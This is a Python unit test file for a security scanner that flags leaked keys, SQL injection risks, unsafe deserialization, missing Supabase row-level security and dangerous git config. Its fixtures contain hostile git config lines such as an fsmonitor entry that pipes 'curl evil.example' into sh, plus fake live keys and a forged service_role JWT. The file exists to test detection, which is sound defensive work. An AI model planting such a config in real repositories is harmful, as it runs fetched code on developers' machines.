import sys
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO_ROOT / "src"))

from mmu_cli import vibecheck  # noqa: E402
from mmu_cli.cli import command_vibecheck  # noqa: E402


def write(root: Path, rel: str, content: str) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    vibecheck._READ_CACHE.pop(path, None)  # checks share a per-run read cache; a rewritten fixture must not hit it


class SecretCheckTests(unittest.TestCase):
    def test_flags_stripe_live_key(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/pay.py", 'KEY = "sk_live_' + "a1b2c3d4e5" * 3 + '"')
            finding = vibecheck.check_secrets(root, [root / "src/pay.py"])
            self.assertEqual(finding.status, "fail")
            self.assertIn("Stripe live secret key", finding.message)
            self.assertEqual(finding.files, ["src/pay.py"])

    def test_flags_unignored_env_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, ".env", "SECRET=hello")
            write(root, ".gitignore", "node_modules/\n")
            finding = vibecheck.check_secrets(root, [])
            self.assertEqual(finding.status, "fail")
            self.assertIn(".env", finding.files)

    def test_clean_when_env_ignored(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, ".env", "SECRET=hello")
            write(root, ".gitignore", ".env\n")
            write(root, "src/app.py", "x = 1")
            finding = vibecheck.check_secrets(root, [root / "src/app.py"])
            self.assertEqual(finding.status, "ok")


class PasswordResetTests(unittest.TestCase):
    def test_fails_when_auth_without_reset(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/auth/login.ts", "export function login() {}")
            finding = vibecheck.check_password_reset(root, [root / "src/auth/login.ts"])
            self.assertEqual(finding.status, "fail")

    def test_ok_when_reset_present(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/auth/login.ts", "// handles forgot password flow")
            finding = vibecheck.check_password_reset(root, [root / "src/auth/login.ts"])
            self.assertEqual(finding.status, "ok")

    def test_skips_without_auth_files(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/util.ts", "export const x = 1")
            finding = vibecheck.check_password_reset(root, [root / "src/util.ts"])
            self.assertEqual(finding.status, "skip")


class SqlFstringTests(unittest.TestCase):
    def test_flags_fstring_sql(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/db.py", 'q = f"SELECT * FROM users WHERE id = {user_id}"')
            finding = vibecheck.check_sql_strings(root, [root / "src/db.py"])
            self.assertEqual(finding.status, "fail")

    def test_ok_for_parameterized(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/db.py", 'cur.execute("SELECT * FROM users WHERE id = %s", (user_id,))')
            finding = vibecheck.check_sql_strings(root, [root / "src/db.py"])
            self.assertEqual(finding.status, "ok")


class UnsafeDeserializationTests(unittest.TestCase):
    def test_flags_pickle_loads(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/cache.py", "import pickle\nvalue = pickle.loads(payload)\n")
            finding = vibecheck.check_unsafe_deserialization(root, [root / "src/cache.py"])
            self.assertEqual(finding.status, "fail")
            self.assertIn("pickle.loads", finding.message)
            self.assertEqual(finding.files, ["src/cache.py"])

    def test_flags_aliased_pickle_loads(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/cache.py", "from pickle import loads as decode\nvalue = decode(payload)\n")
            finding = vibecheck.check_unsafe_deserialization(root, [root / "src/cache.py"])
            self.assertEqual(finding.status, "fail")
            self.assertIn("pickle.loads", finding.message)

    def test_flags_pickle_module_alias_loads(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/cache.py", "import pickle as p\nvalue = p.loads(payload)\n")
            finding = vibecheck.check_unsafe_deserialization(root, [root / "src/cache.py"])
            self.assertEqual(finding.status, "fail")
            self.assertIn("pickle.loads", finding.message)

    def test_flags_yaml_load_without_safe_loader(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/config.py", "import yaml\nconfig = yaml.load(raw_config)\n")
            finding = vibecheck.check_unsafe_deserialization(root, [root / "src/config.py"])
            self.assertEqual(finding.status, "fail")
            self.assertIn("yaml.load without SafeLoader", finding.message)

    def test_ok_for_safe_yaml_load(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/config.py", "import yaml\nconfig = yaml.safe_load(raw_config)\n")
            finding = vibecheck.check_unsafe_deserialization(root, [root / "src/config.py"])
            self.assertEqual(finding.status, "ok")

    def test_ok_for_yaml_load_with_safe_loader_after_nested_call(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/config.py", "import yaml\nconfig = yaml.load(stream.read(), Loader=yaml.SafeLoader)\n")
            finding = vibecheck.check_unsafe_deserialization(root, [root / "src/config.py"])
            self.assertEqual(finding.status, "ok")


class RateLimitAndCorsTests(unittest.TestCase):
    def test_warns_on_server_without_rate_limit(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "package.json", '{"dependencies": {"express": "^4"}}')
            write(root, "src/server.js", "const app = express()")
            finding = vibecheck.check_rate_limiting(root, [root / "src/server.js"])
            self.assertEqual(finding.status, "warn")

    def test_ok_with_limiter(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "package.json", '{"dependencies": {"express": "^4"}}')
            write(root, "src/server.js", "import rateLimit from 'express-rate-limit'")
            finding = vibecheck.check_rate_limiting(root, [root / "src/server.js"])
            self.assertEqual(finding.status, "ok")

    def test_skips_without_server(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/lib.py", "def add(a, b): return a + b")
            finding = vibecheck.check_rate_limiting(root, [root / "src/lib.py"])
            self.assertEqual(finding.status, "skip")

    def test_warns_on_wildcard_cors(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/api.py", 'app.add_middleware(CORSMiddleware, allow_origins=["*"])')
            finding = vibecheck.check_cors(root, [root / "src/api.py"])
            self.assertEqual(finding.status, "warn")


class DebugAndMonitoringTests(unittest.TestCase):
    def test_warns_on_debug_true(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "settings.py", "DEBUG = True\n")
            finding = vibecheck.check_debug_mode(root, [root / "settings.py"])
            self.assertEqual(finding.status, "warn")

    def test_monitoring_detected_from_requirements(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "requirements.txt", "sentry-sdk==2.0\n")
            finding = vibecheck.check_error_monitoring(root, [])
            self.assertEqual(finding.status, "ok")


class CommandTests(unittest.TestCase):
    def test_command_vibecheck_exit_codes(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            # Webhook handler without signature/idempotency -> P0 fails
            write(root, "src/webhooks/stripe.ts", "export async function POST(req) { return ok() }")
            result = command_vibecheck(root)
            self.assertEqual(result.exit_code, 2)
            self.assertTrue(any("webhook" in m for m in result["messages"]))
            self.assertIn("findings", result)

    def test_command_vibecheck_clean_project(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/lib.py", "def add(a, b): return a + b")
            result = command_vibecheck(root)
            self.assertEqual(result.exit_code, 0)


def _service_role_jwt() -> str:
    import base64
    import json
    def b64(d):
        return base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip("=")
    return f"{b64({'alg': 'HS256', 'typ': 'JWT'})}.{b64({'iss': 'supabase', 'role': 'service_role', 'iat': 1})}.{'x' * 43}"


def _anon_jwt() -> str:
    import base64
    import json
    def b64(d):
        return base64.urlsafe_b64encode(json.dumps(d).encode()).decode().rstrip("=")
    return f"{b64({'alg': 'HS256', 'typ': 'JWT'})}.{b64({'iss': 'supabase', 'role': 'anon', 'iat': 1})}.{'x' * 43}"


class ClientBundleSecretTests(unittest.TestCase):
    def test_flags_service_role_jwt_behind_public_prefix(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, ".env", f"NEXT_PUBLIC_SUPABASE_KEY={_service_role_jwt()}\n")
            finding = vibecheck.check_client_bundle_secrets(root, [])
            self.assertEqual(finding.status, "fail")
            self.assertIn("service_role", finding.message)
            self.assertEqual(finding.files, [".env"])
            self.assertTrue(finding.ref.startswith("https://"))

    def test_anon_jwt_behind_public_prefix_is_fine(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, ".env", f"NEXT_PUBLIC_SUPABASE_ANON_KEY={_anon_jwt()}\nVITE_STRIPE_PUBLISHABLE_KEY=pk_live_abc\n")
            finding = vibecheck.check_client_bundle_secrets(root, [])
            self.assertEqual(finding.status, "ok")

    def test_flags_secret_looking_public_name(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, ".env.local", "VITE_STRIPE_SECRET_KEY=whatever\n")
            finding = vibecheck.check_client_bundle_secrets(root, [])
            self.assertEqual(finding.status, "fail")
            self.assertIn("VITE_STRIPE_SECRET_KEY", finding.message)

    def test_flags_public_secret_read_in_client_code(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/lib.ts", "const k = import.meta.env.VITE_SUPABASE_SERVICE_ROLE_KEY;")
            finding = vibecheck.check_client_bundle_secrets(root, [root / "src/lib.ts"])
            self.assertEqual(finding.status, "fail")
            self.assertEqual(finding.files, ["src/lib.ts"])

    def test_ignores_env_example(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, ".env.example", "NEXT_PUBLIC_SECRET=fill-me\n")
            finding = vibecheck.check_client_bundle_secrets(root, [])
            self.assertEqual(finding.status, "ok")


class SupabaseRlsTests(unittest.TestCase):
    def test_skips_without_supabase(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/app.py", "print('hi')")
            self.assertEqual(vibecheck.check_supabase_rls(root, [root / "src/app.py"]).status, "skip")

    def test_warns_when_supabase_but_no_migrations(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "package.json", '{"dependencies": {"@supabase/supabase-js": "^2"}}')
            finding = vibecheck.check_supabase_rls(root, [])
            self.assertEqual(finding.status, "warn")
            self.assertIn("cannot be verified", finding.message)

    def test_fails_on_table_without_rls(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "package.json", '{"dependencies": {"@supabase/supabase-js": "^2"}}')
            write(root, "supabase/migrations/001_init.sql",
                  "create table public.profiles (id uuid primary key);\n"
                  "create table if not exists \"orders\" (id serial);\n"
                  "alter table public.profiles enable row level security;\n"
                  "create policy p on public.profiles for select using (true);\n")
            finding = vibecheck.check_supabase_rls(root, [])
            self.assertEqual(finding.status, "fail")
            self.assertIn("orders", finding.message)
            self.assertNotIn("profiles", finding.message)
            self.assertEqual(finding.files, ["supabase/migrations/001_init.sql"])

    def test_ok_when_every_table_has_rls(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "supabase/config.toml", "")
            write(root, "supabase/migrations/001.sql",
                  "CREATE TABLE notes (id int);\nALTER TABLE notes ENABLE ROW LEVEL SECURITY;\n")
            finding = vibecheck.check_supabase_rls(root, [])
            self.assertEqual(finding.status, "ok")
            self.assertIn("1 table", finding.message)


class SourcemapTests(unittest.TestCase):
    def test_flags_vite_sourcemap_true(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "vite.config.ts", "export default { build: { sourcemap: true } }")
            finding = vibecheck.check_sourcemaps(root, [])
            self.assertEqual(finding.status, "warn")
            self.assertEqual(finding.files, ["vite.config.ts"])

    def test_flags_next_production_browser_source_maps(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "next.config.mjs", "export default { productionBrowserSourceMaps: true }")
            self.assertEqual(vibecheck.check_sourcemaps(root, []).status, "warn")

    def test_ok_when_disabled_hidden_or_absent(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "vite.config.ts", "export default { build: { sourcemap: false } }")
            self.assertEqual(vibecheck.check_sourcemaps(root, []).status, "ok")
            write(root, "vite.config.ts", "export default { build: { sourcemap: 'hidden' } }")
            self.assertEqual(vibecheck.check_sourcemaps(root, []).status, "ok", "hidden maps are the recommended fix")


class GitConfigExecTests(unittest.TestCase):
    def test_flags_fsmonitor_and_shell_alias(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, ".git/config",
                  "[core]\n\trepositoryformatversion = 0\n\tfsmonitor = curl evil.example | sh\n"
                  "[alias]\n\tst = status\n\tpwn = !sh -c 'id'\n")
            finding = vibecheck.check_git_config_exec(root, [])
            self.assertEqual(finding.status, "fail")
            self.assertIn("core.fsmonitor", finding.message)
            self.assertIn("alias.pwn", finding.message)
            self.assertNotIn("alias.st", finding.message)

    def test_ok_on_ordinary_config(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, ".git/config",
                  "[core]\n\tbare = false\n\tfilemode = true\n[remote \"origin\"]\n\turl = https://example.com/x.git\n"
                  "[credential]\n\thelper = osxkeychain\n[filter \"lfs\"]\n\trequired = true\n[core]\n\tpager = delta\n\teditor = vim\n")
            self.assertEqual(vibecheck.check_git_config_exec(root, []).status, "ok")

    def test_skips_without_git_dir(self):
        with tempfile.TemporaryDirectory() as tmp:
            self.assertEqual(vibecheck.check_git_config_exec(Path(tmp), []).status, "skip")


class TestPathDowngradeTests(unittest.TestCase):
    def test_fail_only_in_fixtures_becomes_warn(self):
        f = vibecheck.Finding("secrets", "P0", "fail", "x", files=["tests/fixtures/keys.py", "src/foo.test.ts"])
        out = vibecheck.downgrade_test_only_findings([f])[0]
        self.assertEqual((out.severity, out.status), ("P1", "warn"))
        self.assertIn("downgraded", out.message)

    def test_mixed_paths_stay_fail(self):
        f = vibecheck.Finding("secrets", "P0", "fail", "x", files=["tests/fixtures/keys.py", "src/pay.py"])
        out = vibecheck.downgrade_test_only_findings([f])[0]
        self.assertEqual((out.severity, out.status), ("P0", "fail"))

    def test_run_vibecheck_applies_downgrade_end_to_end(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "src/__tests__/fixtures/fake.py", 'KEY = "sk_live_' + "a1b2c3d4e5" * 3 + '"')
            findings = {f.check: f for f in vibecheck.run_vibecheck(root)}
            self.assertEqual(findings["secrets"].status, "warn")


class ReviewRegressionTests(unittest.TestCase):
    """One test per confirmed finding from the PR #34 review."""

    def test_git_config_one_line_section_form_and_include(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, ".git/config", "[core] fsmonitor = curl evil.example | sh\n[include]\n\tpath = ../payload\n")
            write(root, "payload", "[diff]\n\texternal = /tmp/x\n")
            finding = vibecheck.check_git_config_exec(root, [])
            self.assertEqual(finding.status, "fail")
            self.assertIn("core.fsmonitor", finding.message)
            self.assertIn("diff.external", finding.message)

    def test_git_config_via_gitdir_pointer_worktree(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "main/.git/config", "[core]\n\tfsmonitor = echo pwned\n")
            write(root, "main/.git/worktrees/wt/commondir", "../..\n")
            write(root, "wt/.git", "gitdir: ../main/.git/worktrees/wt\n")
            finding = vibecheck.check_git_config_exec(root / "wt", [])
            self.assertEqual(finding.status, "fail", finding.message)
            self.assertIn("fsmonitor", finding.message)

    def test_git_config_benign_tooling_is_ok(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, ".git/config",
                  "[core]\n\thooksPath = .husky/_\n\tfsmonitor = true\n\tsshCommand = \"ssh\" -i /tmp/key -o StrictHostKeyChecking=no\n"
                  "[filter \"lfs\"]\n\tclean = git-lfs clean -- %f\n\tsmudge = git-lfs smudge -- %f\n\tprocess = git-lfs filter-process\n\trequired = true\n"
                  "[credential]\n\thelper = osxkeychain\n")
            self.assertEqual(vibecheck.check_git_config_exec(root, []).status, "ok")
            write(root, ".git/config", "[core]\n\thooksPath = /tmp/evil-hooks\n")
            self.assertEqual(vibecheck.check_git_config_exec(root, []).status, "fail")

    def test_downgrade_uses_full_offender_list_not_truncated(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            for i in range(11):
                write(root, f"src/__tests__/auth_{i:02d}.test.ts", "login()")
            write(root, "src/zz_routes/auth.ts", "session login signin")
            files = sorted((root / "src").rglob("*.ts"))
            finding = vibecheck.check_password_reset(root, files)
            self.assertEqual(finding.status, "fail")
            self.assertEqual(len(finding.files), 12)
            out = vibecheck.downgrade_test_only_findings([finding])[0]
            self.assertEqual(out.status, "fail", "a real auth file is in the list; must not be downgraded")

    def test_is_test_path_is_conservative(self):
        yes = ["tests/fixtures/keys.py", "src/__tests__/a.test.ts", "pkg/foo_test.go", "spec/models/user_spec.rb", "src/util.spec.tsx"]
        no = ["src/app/test/route.ts", "src/app/example/route.ts", "src/mocks/server.ts", ".env.test.local",
              "examples/demo.py", "src/testing_utils.py", "src/latest.py", "app/test/page.tsx"]
        for rel in yes:
            self.assertTrue(vibecheck._is_test_path(rel), rel)
        for rel in no:
            self.assertFalse(vibecheck._is_test_path(rel), rel)

    def test_supabase_rls_ignores_non_supabase_projects(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "package.json", '{"dependencies": {"redis": "^4", "prisma": "^5"}}')
            write(root, "src/cache.ts", "import { createClient } from 'redis'; createClient()")
            write(root, "prisma/migrations/0001_init/migration.sql", 'CREATE TABLE "User" (id int);')
            self.assertEqual(vibecheck.check_supabase_rls(root, [root / "src/cache.ts"]).status, "skip")

    def test_supabase_rls_schema_comments_and_nested_app(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "apps/web/package.json", '{"dependencies": {"@supabase/supabase-js": "^2"}}')
            write(root, "apps/web/supabase/migrations/001.sql",
                  "-- create table legacy (id int);\n"
                  "/* create table ghost (id int); */\n"
                  "create table analytics.events (id int);\n"
                  "alter table analytics.events enable row level security;\n"
                  "create table public.orders (id int);\n")
            write(root, "apps/web/supabase/functions/node_modules/pkg/schema.sql", "create table vendor_jobs (id int);")
            write(root, "package.json", '{"dependencies": {"@supabase/supabase-js": "^2"}}')
            finding = vibecheck.check_supabase_rls(root, [])
            self.assertEqual(finding.status, "fail")
            self.assertIn("public.orders", finding.message)
            for absent in ("legacy", "ghost", "analytics", "vendor_jobs"):
                self.assertNotIn(absent, finding.message)

    def test_supabase_rls_no_migrations_is_p1_warn(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "package.json", '{"dependencies": {"@supabase/ssr": "^0.5"}}')
            finding = vibecheck.check_supabase_rls(root, [])
            self.assertEqual((finding.severity, finding.status), ("P1", "warn"))

    def test_dotenv_inline_comment_and_quotes(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, ".env", f"NEXT_PUBLIC_SUPABASE_KEY={_service_role_jwt()}  # service role\n")
            self.assertEqual(vibecheck.check_client_bundle_secrets(root, []).status, "fail", "comment must not hide the JWT")
            fake_key = "sk_live_" + "a1b2c3d4e5" * 3  # assembled at runtime so push protection does not see a key literal
            write(root, ".env", f"NEXT_PUBLIC_MODE=live # replaced {fake_key}\nNEXT_PUBLIC_X=\"abc\" # note\n")
            self.assertEqual(vibecheck.check_client_bundle_secrets(root, []).status, "ok", "comment text must not be scanned as a value")

    def test_secretish_name_is_token_based(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, ".env", "NEXT_PUBLIC_PRIVATE_BETA=true\nVITE_PRIVATE_ROUTES=/admin\nNEXT_PUBLIC_SECRETARY_EMAIL=x@y.z\nREACT_APP_SK_TEST_MODE=1\n")
            self.assertEqual(vibecheck.check_client_bundle_secrets(root, []).status, "ok")
            write(root, ".env", f"NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY={_service_role_jwt()}\n")
            finding = vibecheck.check_client_bundle_secrets(root, [])
            self.assertEqual(finding.status, "fail")
            self.assertIn("service_role JWT", finding.message, "value-confirmed label must win over the name label")

    def test_monorepo_env_and_sourcemap_are_found(self):
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "apps/web/.env.local", f"NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY={_service_role_jwt()}\n")
            write(root, "apps/web/next.config.mjs", "export default { productionBrowserSourceMaps: true }")
            write(root, ".envrc", "export NEXT_PUBLIC_SECRET=direnv-not-bundled\n")
            write(root, "node_modules/pkg/.env", "NEXT_PUBLIC_SECRET=ignored\n")
            secrets = vibecheck.check_client_bundle_secrets(root, [])
            self.assertEqual(secrets.status, "fail")
            self.assertEqual(secrets.files, ["apps/web/.env.local"])
            maps = vibecheck.check_sourcemaps(root, [])
            self.assertEqual(maps.status, "warn")
            self.assertEqual(maps.files, ["apps/web/next.config.mjs"])

    def test_gather_code_files_prunes_nested_build_dirs_and_includes_mjs(self):
        from mmu_cli.cli import DEFAULT_SKIP_PATHS, gather_code_files
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            write(root, "apps/web/.next/static/chunk.js", "x")
            write(root, "apps/web/node_modules/dep/index.js", "x")
            write(root, "apps/api/venv/lib/site-packages/m.py", "x")
            write(root, "apps/web/next.config.mjs", "x")
            write(root, "apps/web/src/index.ts", "x")
            rels = sorted(p.relative_to(root).as_posix() for p in gather_code_files(root, set(DEFAULT_SKIP_PATHS)))
            self.assertEqual(rels, ["apps/web/next.config.mjs", "apps/web/src/index.ts"])


if __name__ == "__main__":
    unittest.main()
